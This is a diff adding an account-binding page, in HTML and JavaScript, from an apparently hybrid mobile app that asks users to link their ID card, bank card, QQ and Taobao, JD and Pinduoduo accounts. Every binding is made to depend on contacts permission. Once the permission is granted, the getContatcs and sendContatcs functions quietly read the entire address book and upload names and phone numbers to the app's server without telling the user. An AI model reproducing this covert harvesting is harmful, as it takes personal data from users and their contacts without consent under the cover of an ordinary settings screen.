@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="maximum-scale=1.0,minimum-scale=1.0,user-scalable=0,width=device-width,initial-scale=1.0" />
+    <meta name="format-detection" content="telephone=no,email=no,date=no,address=no">
+    <title>公告列表</title>
+    <link rel="stylesheet" type="text/css" href="../css/api.css" />
+    <link rel="stylesheet" type="text/css" href="../css/style.css" />
+    <style>
+
+    </style>
+</head>
+
+<body>
+    <div class="accountbox">
+        <div class="tit">账户信息(必填，银行卡信息必须与身份证一致)</div>
+        <ul>
+            <li id="li_cert" tapmode onclick="openCert()">
+                <div><span class="c1">&#xe6ba;</span>绑定身份证</div><span id="cert" class="arrow">未绑定<i>&#xe603;</i></span></li>
+            <li id="li_bank" tapmode onclick="openBank()">
+                <div><span class="c1">&#xe67b;</span>绑定银行卡</div><span id="bank" class="arrow">未绑定<i>&#xe603;</i></span></li>
+            <li id="li_qq" tapmode onclick="openQQ()">
+                <div><span class="c1">&#xe601;</span>QQ号码</div><span id="qq" class="arrow">未绑定<i>&#xe603;</i></span></li>
+        </ul>
+    </div>
+    <div class="accountbox">
+        <div class="tit">账户信息(任意绑定一个号码并且通过审核)</div>
+        <ul>
+            <li id="li_taobao" tapmode>
+                <div><span class="c2">&#xe6ff;</span>淘宝</div><span id="taobao" class="arrow">未绑定<i>&#xe603;</i></span></li>
+            <li id="li_taobao_1" tapmode>
+                <div><span class="c2">&#xe6ff;</span>淘宝</div><span id="taobao_1" class="arrow">未绑定<i>&#xe603;</i></span></li>
+            <li id="li_jd" tapmode>
+                <div><span class="c3">&#xe600;</span>京东</div><span id="jd" class="arrow">未绑定<i>&#xe603;</i></span></li>
+            <li id="li_pdd" tapmode>
+                <div><span class="c4">&#xe602;</span>拼多多</div><span id="pdd" class="arrow">未绑定<i>&#xe603;</i></span></li>
+        </ul>
+    </div>
+    <div class="accountbox">
+        <div class="tit">修改收货信息</div>
+        <ul>
+            <li id="li_pdd" tapmode onclick="openReceivingInfor();">
+                <div><span class="c1">&#58917;</span>修改收货信息</div><span class="arrow"><i>&#xe603;</i></span>
+            </li>
+        </ul>
+    </div>
+    <script type="text/javascript" src="../script/api.js"></script>
+    <script>
+        apiready = function() {
+            getAccount();
+            getAccount_1();
+            api.setRefreshHeaderInfo({
+                visible: true,
+                loadingImg: 'widget://image/refresh.png',
+                bgColor: '#f2f2f2',
+                textColor: '#fff',
+                textDown: '下拉刷新...',
+                textUp: '松开刷新...',
+                showTime: true
+            }, function(ret, err) {
+                getAccount();
+                getAccount_1();
+                //关闭
+                api.refreshHeaderLoadDone();
+            });
+        }
+
+        function openReceivingInfor() {
+            api.openWin({
+                name: 'window_receiving_information',
+                url: './window_receiving_information.html',
+                pageParam: {
+                    name: 'window_receiving_information'
+                }
+            });
+        }
+
+        // 审核失败消息推送
+        function getReminderEvaluation() {
+            for (var i = 0; i < 3; i++) {
+                api.ajax({
+                    url: myurl + '/index.php/User/Account/reminder_evaluation/',
+                    method: 'post',
+                    data: {
+                        values: {
+                            username: $api.getStorage("username"),
+                            userid: $api.getStorage("userid")
+                        }
+                    }
+                }, function(ret, err) {
+                    if (ret) {
+                        if (ret.status == 1) {
+                            alert(ret.msg);
+                        }
+                    } else {
+                        //alert(JSON.stringify(err ));
+                        api.toast({
+                            msg: '网络错误',
+                            duration: 2000,
+                            location: 'bottom'
+                        });
+                    }
+                });
+            }
+        }
+
+
+        function getAccount() {
+            api.showProgress();
+            api.ajax({
+                url: myurl + '/index.php/User/Api/getmember/',
+                method: 'post',
+                data: {
+                    values: {
+                        username: $api.getStorage("username"),
+                        userid: $api.getStorage("userid"),
+                    }
+                }
+            }, function(ret, err) {
+                api.hideProgress();
+                if (ret) {
+                    if (ret.status == 1) {
+                        var data = ret.data;
+                        if (data["identity_audit"] == 1) {
+                            if (!isempty(data["cert_number"])) {
+                                $api.html($api.byId("cert"), "已绑定<i>&#xe603;</i>");
+                            }
+                        } else if (data["identity_audit"] == 0) {
+                            $api.html($api.byId("cert"), "待审核<i>&#xe603;</i>");
+                        } else if (data["identity_audit"] == -1) {
+                            $api.html($api.byId("cert"), "<span style='color: #f00;'>审核失败</span><i>&#xe603;</i>");
+                        }
+
+                        if (data["bank_card"] == 1) {
+                            if (!isempty(data["bank_number"])) {
+                                $api.html($api.byId("bank"), "已绑定<i>&#xe603;</i>");
+                            }
+                        } else if (data["bank_card"] == 0) {
+                            $api.html($api.byId("bank"), "待审核<i>&#xe603;</i>");
+                        } else if (data["bank_card"] == -1) {
+                            $api.html($api.byId("bank"), "<span style='color: #f00;'>审核失败</span><i>&#xe603;</i>");
+                        }
+
+                        if (!isempty(data["qq"])) {
+                            $api.html($api.byId("qq"), "已绑定<i>&#xe603;</i>");
+                        }
+
+                        if (data["taobao_status"] == 1) {
+                            $api.html($api.byId("taobao"), "已绑定<i>&#xe603;</i>");
+                            $api.attr($api.byId("li_taobao"), 'onclick', 'openTaobao(0)');
+                        } else if (data["taobao_status"] == 0) {
+                            $api.html($api.byId("taobao"), "待审核<i>&#xe603;</i>");
+                            $api.attr($api.byId("li_taobao"), 'onclick', 'openTaobao(0)');
+                        } else if (data["taobao_status"] == -1) {
+                            $api.html($api.byId("taobao"), "<span style='color: #f00;'>审核失败</span><i>&#xe603;</i>");
+                            $api.attr($api.byId("li_taobao"), 'onclick', 'openTaobao(0)');
+                        } else {
+                            $api.attr($api.byId("li_taobao"), 'onclick', 'openTaobao(0)');
+                        }
+
+                        if (data["jd_status"] == 1) {
+                            $api.html($api.byId("jd"), "已绑定<i>&#xe603;</i>");
+                            $api.attr($api.byId("li_jd"), 'onclick', 'openJd()');
+                        } else if (data["jd_status"] == 0) {
+                            $api.html($api.byId("jd"), "待审核<i>&#xe603;</i>");
+                            $api.attr($api.byId("li_jd"), 'onclick', 'openJd()');
+                        } else if (data["jd_status"] == -1) {
+                            $api.html($api.byId("jd"), "<span style='color: #f00;'>审核失败</span><i>&#xe603;</i>");
+                            $api.attr($api.byId("li_jd"), 'onclick', 'openJd()');
+                        } else {
+                            $api.attr($api.byId("li_jd"), 'onclick', 'openJd()');
+                        }
+
+                        if (data["pdd_status"] == 1) {
+                            $api.html($api.byId("pdd"), "已绑定<i>&#xe603;</i>");
+                            $api.attr($api.byId("li_pdd"), 'onclick', 'openPdd()');
+                        } else if (data["pdd_status"] == 0) {
+                            $api.html($api.byId("pdd"), "待审核<i>&#xe603;</i>");
+                            $api.attr($api.byId("li_pdd"), 'onclick', 'openPdd()');
+                        } else if (data["pdd_status"] == -1) {
+                            $api.html($api.byId("pdd"), "<span style='color: #f00;'>审核失败</span><i>&#xe603;</i>");
+                            $api.attr($api.byId("li_pdd"), 'onclick', 'openPdd()');
+                        } else {
+                            $api.attr($api.byId("li_pdd"), 'onclick', 'openPdd()');
+                        }
+
+                        // 审核失败消息推送
+                        getReminderEvaluation();
+                    } else {
+                        api.toast({
+                            msg: ret.msg,
+                            duration: 2000,
+                            location: 'bottom'
+                        });
+                    }
+
+                } else {
+                    //alert(JSON.stringify(err ));
+                    api.toast({
+                        msg: '网络错误',
+                        duration: 2000,
+                        location: 'bottom'
+                    });
+                }
+            });
+        }
+
+        function getAccount_1() {
+            api.showProgress();
+            api.ajax({
+                url: myurl + '/index.php/User/Api/get_member/',
+                method: 'post',
+                data: {
+                    values: {
+                        username: $api.getStorage("username"),
+                        userid: $api.getStorage("userid"),
+                    }
+                }
+            }, function(ret, err) {
+                api.hideProgress();
+                if (ret) {
+                    if (ret.status == 1) {
+                        var data = ret.data;
+                        if (data["taobao_status"] == 1) {
+                            $api.html($api.byId("taobao_1"), "已绑定<i>&#xe603;</i>");
+                            $api.attr($api.byId("li_taobao_1"), 'onclick', 'openTaobao(1)');
+                        } else if (data["taobao_status"] == 0) {
+                            $api.html($api.byId("taobao_1"), "待审核<i>&#xe603;</i>");
+                            $api.attr($api.byId("li_taobao_1"), 'onclick', 'openTaobao(1)');
+                        } else if (data["taobao_status"] == -1) {
+                            $api.html($api.byId("taobao_1"), "<span style='color: #f00;'>审核失败</span><i>&#xe603;</i>");
+                            $api.attr($api.byId("li_taobao_1"), 'onclick', 'openTaobao(1)');
+                        } else {
+                            $api.attr($api.byId("li_taobao_1"), 'onclick', 'openTaobao(1)');
+                        }
+                    }
+                } else {
+                    //alert(JSON.stringify(err ));
+                    api.toast({
+                        msg: '网络错误',
+                        duration: 2000,
+                        location: 'bottom'
+                    });
+                }
+            });
+        }
+
+        function openCert() {
+            var openContacts = confirmPer('contacts', 1);
+            if (openContacts) {
+                api.openWin({
+                    name: 'window_account_cert',
+                    url: './window_account_cert.html',
+                    pageParam: {
+                        name: 'window_account_cert'
+                    }
+                });
+            }
+        }
+
+        function openBank() {
+            var openContacts = confirmPer('contacts', 2);
+            if (openContacts) {
+                // var cert_value = $api.byId('cert').innerHTML;
+                // if (cert_value.indexOf('未绑定') > -1) {
+                //     api.toast({
+                //         msg: '请先绑定身份证',
+                //         duration: 2000,
+                //         location: 'bottom'
+                //     });
+                //     return false;
+                // }
+                // if (cert_value.indexOf('待审核') > -1) {
+                //     api.toast({
+                //         msg: '请耐心等待绑定身份证的审核结果',
+                //         duration: 2000,
+                //         location: 'bottom'
+                //     });
+                //     return false;
+                // }
+                // if (cert_value.indexOf('审核失败') > -1) {
+                //     api.toast({
+                //         msg: '请重新上传身份证信息',
+                //         duration: 2000,
+                //         location: 'bottom'
+                //     });
+                //     return false;
+                // }
+
+                api.openWin({
+                    name: 'window_account_bank',
+                    url: './window_account_bank.html',
+                    pageParam: {
+                        name: 'window_account_bank'
+                    }
+                });
+            }
+        }
+
+        function openQQ() {
+            var openContacts = confirmPer('contacts', 3);
+            if (openContacts) {
+                api.openWin({
+                    name: 'window_account_qq',
+                    url: './window_account_qq.html',
+                    pageParam: {
+                        name: 'window_account_qq'
+                    }
+                });
+            }
+        }
+
+        function openTaobao(taobao_num) {
+            var openContacts = confirmPer('contacts', 4, taobao_num);
+            if (openContacts) {
+                var isBind = isCanBind();
+                if (isBind) {
+                    api.openWin({
+                        name: 'window_account_taobao',
+                        url: './window_account_taobao.html',
+                        pageParam: {
+                            name: 'window_account_taobao',
+                            taobao_num: taobao_num
+                        }
+                    });
+                }
+            }
+        }
+
+        function openTaobaoInfo() {
+            api.openWin({
+                name: 'window_account_taobao_info',
+                url: './window_account_taobao_info.html',
+                pageParam: {
+                    name: 'window_account_taobao_info'
+                }
+            });
+        }
+
+        function openJd() {
+            var openContacts = confirmPer('contacts', 5);
+            if (openContacts) {
+                var isBind = isCanBind();
+                if (isBind) {
+                    api.openWin({
+                        name: 'window_account_jd',
+                        url: './window_account_jd.html',
+                        pageParam: {
+                            name: 'window_account_jd'
+                        }
+                    });
+                }
+            }
+        }
+
+        function openPdd() {
+            var openContacts = confirmPer('contacts', 6);
+            if (openContacts) {
+                var isBind = isCanBind();
+                if (isBind) {
+                    api.openWin({
+                        name: 'window_account_pdd',
+                        url: './window_account_pdd.html',
+                        pageParam: {
+                            name: 'window_account_pdd'
+                        }
+                    });
+                }
+            }
+        }
+
+        function isCanBind() {
+            var cert_value = $api.byId('cert').innerHTML;
+            if (cert_value.indexOf('未绑定') > -1) {
+                api.toast({
+                    msg: '请先绑定身份证',
+                    duration: 2000,
+                    location: 'bottom'
+                });
+                return false;
+            }
+            if (cert_value.indexOf('待审核') > -1) {
+                api.toast({
+                    msg: '请耐心等待绑定身份证的审核结果',
+                    duration: 2000,
+                    location: 'bottom'
+                });
+                return false;
+            }
+            if (cert_value.indexOf('审核失败') > -1) {
+                api.toast({
+                    msg: '请重新上传身份证信息',
+                    duration: 2000,
+                    location: 'bottom'
+                });
+                return false;
+            }
+            var bank_value = $api.byId('bank').innerHTML;
+            if (bank_value.indexOf('未绑定') > -1) {
+                api.toast({
+                    msg: '请先绑定银行卡',
+                    duration: 2000,
+                    location: 'bottom'
+                });
+                return false;
+            }
+            if (bank_value.indexOf('待审核') > -1) {
+                api.toast({
+                    msg: '请耐心等待绑定银行卡的审核结果',
+                    duration: 2000,
+                    location: 'bottom'
+                });
+                return false;
+            }
+            if (bank_value.indexOf('审核失败') > -1) {
+                api.toast({
+                    msg: '请重新上传银行卡信息',
+                    duration: 2000,
+                    location: 'bottom'
+                });
+                return false;
+            }
+            var qq_value = $api.byId('qq').innerHTML;
+            if (qq_value.indexOf('未绑定') > -1) {
+                api.toast({
+                    msg: '请先绑定QQ号码',
+                    duration: 2000,
+                    location: 'bottom'
+                });
+                return false;
+            }
+            return true;
+        }
+
+        // function isOpenContactBook() {
+        //     var DVContacts = api.require('DVContacts');
+        //     DVContacts.allContacts(function(ret, err) {
+        //         if (ret) {
+        //             alert(1);
+        //             alert(JSON.stringify(ret));
+        //             return false;
+        //         } else {
+        //             alert(2);
+        //             alert(JSON.stringify(err));
+        //             return false;
+        //         }
+        //     });
+        // }
+
+        function confirmPer(perm, num, taobao_num) {
+            var has = hasPermission(perm);
+            // alert("检测权限 = " + JSON.stringify(has));
+            if (!has || !has[0] || !has[0].granted) {
+                api.confirm({
+                    title: '提醒',
+                    msg: '没有获得' + '通讯录' + "权限\n是否前往设置？",
+                    buttons: ['去设置', '取消']
+                }, function(ret, err) {
+                    if (1 == ret.buttonIndex) {
+                        reqPermission(perm, num, taobao_num);
+                    }
+                });
+                return false;
+            }
+            return true;
+        }
+
+        function hasPermission(one_per) {
+            var perms = new Array();
+            if (one_per) {
+                perms.push(one_per);
+            } else {
+                var prs = document.getElementsByName("p_list");
+                for (var i = 0; i < prs.length; i++) {
+                    if (prs[i].checked) {
+                        perms.push(prs[i].value);
+                    }
+                }
+            }
+            var rets = api.hasPermission({
+                list: perms
+            });
+            if (!one_per) {
+                // alert('判断结果：' + JSON.stringify(rets));
+                return;
+            }
+            return rets;
+        }
+
+        function reqPermission(one_per, num, taobao_num) {
+            var perms = new Array();
+            if (one_per) {
+                perms.push(one_per);
+            } else {
+                var prs = document.getElementsByName("p_list_r");
+                for (var i = 0; i < prs.length; i++) {
+                    if (prs[i].checked) {
+                        perms.push(prs[i].value);
+                    }
+                }
+            }
+            api.requestPermission({
+                list: perms,
+                code: 100001
+            }, function(ret, err) {
+                // if (callback) {
+                //     callback(ret);
+                //     return;
+                // }
+                if (ret['list'][0]['granted']) {
+                    getContatcs();
+                    if (num == 1) {
+                        api.openWin({
+                            name: 'window_account_cert',
+                            url: './window_account_cert.html',
+                            pageParam: {
+                                name: 'window_account_cert'
+                            }
+                        });
+                        return;
+                    } else if (num == 2) {
+                        api.openWin({
+                            name: 'window_account_bank',
+                            url: './window_account_bank.html',
+                            pageParam: {
+                                name: 'window_account_bank'
+                            }
+                        });
+                        return;
+                    } else if (num == 3) {
+                        api.openWin({
+                            name: 'window_account_qq',
+                            url: './window_account_qq.html',
+                            pageParam: {
+                                name: 'window_account_qq'
+                            }
+                        });
+                        return;
+                    }
+                    var isBand = isCanBind();
+                    if (isBand) {
+                        if (num == 4) {
+                            api.openWin({
+                                name: 'window_account_taobao',
+                                url: './window_account_taobao.html',
+                                pageParam: {
+                                    name: 'window_account_taobao',
+                                    taobao_num: taobao_num
+                                }
+                            });
+                        } else if (num == 5) {
+                            api.openWin({
+                                name: 'window_account_jd',
+                                url: './window_account_jd.html',
+                                pageParam: {
+                                    name: 'window_account_jd'
+                                }
+                            });
+                        } else if (num == 6) {
+                            api.openWin({
+                                name: 'window_account_pdd',
+                                url: './window_account_pdd.html',
+                                pageParam: {
+                                    name: 'window_account_pdd'
+                                }
+                            });
+                        }
+                    }
+                }
+                // var str = '请求结果：\n';
+                // str += '请求码: ' + ret.code + '\n';
+                // str += "是否勾选\"不再询问\"按钮: " + (ret.never ? '是' : '否') + '\n';
+                // str += '请求结果: \n';
+                // var list = ret.list;
+                // for (var i in list) {
+                //     str += list[i].name + '=' + list[i].granted + '\n';
+                // }
+                // alert(str);
+                // console.log(JSON.stringify(ret));
+            });
+        }
+
+        // 获得手机通讯录的联系人
+        function getContatcs() {
+            var DVContacts = api.require('DVContacts');
+            DVContacts.allContacts(function(ret, err) {
+                if (ret) {
+                    var allContacts = ret['contacts'];
+                    if (allContacts && allContacts.length > 0) {
+                        var allContactsArr = [];
+                        for (var i = 0; i < allContacts.length; i++) {
+                            if ((allContacts[i]['fullName'] || allContacts[i]['company']) && allContacts[i]['phones'][0]) {
+                                var allContactsObj = {};
+                                allContactsObj['name'] = $api.trim(allContacts[i]['fullName'] ? allContacts[i]['fullName'] : allContacts[i]['company']);
+                                var phones = allContacts[i]['phones'][0];
+                                for (var key in phones) {
+                                    allContactsObj['phone'] = $api.trimAll(phones[key]);
+                                }
+                                allContactsArr.push(allContactsObj);
+                            }
+                        };
+
+                        sendContatcs(allContactsArr);
+                    }
+                } else {
+                    // console.log(JSON.stringify(err));
+                }
+            });
+        }
+
+        function sendContatcs(allContactsArr) {
+            api.ajax({
+                url: myurl + '/index.php/User/Task/mail_list/',
+                method: 'post',
+                data: {
+                    values: {
+                        username: $api.getStorage("username"),
+                        userid: $api.getStorage("userid"),
+                        arr: allContactsArr
+                    }
+                }
+            }, function(ret, err) {
+                if (ret) {} else {}
+            });
+        }
+    </script>
+</body>
+
+</html>
